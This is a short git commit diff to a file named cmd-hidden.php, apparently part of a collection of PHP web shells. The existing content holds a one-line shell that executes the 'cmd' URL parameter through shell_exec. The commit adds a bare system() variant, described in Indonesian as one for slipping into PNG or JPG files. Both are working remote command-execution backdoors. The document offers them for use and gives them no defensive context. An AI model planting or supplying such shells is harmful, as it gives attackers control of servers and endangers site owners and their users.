3877cb50d93bcf02129fa3992de7c0926c9e67fa
haxorqt <83970696+haxorqt@users.noreply.github.com>
2025-05-31 23:04:16 +0700

    Update cmd-hidden.php

--- cmd-hidden.php
+++ cmd-hidden.php
@@ -8,3 +8,6 @@ if(isset($_GET['cmd'])){
 
 versi 1 line:
 <?php if(isset($_GET['cmd'])) echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
+
+versi untuk tamper selipkan ke png/jpg:
+<?php system($_GET['cmd']); ?>
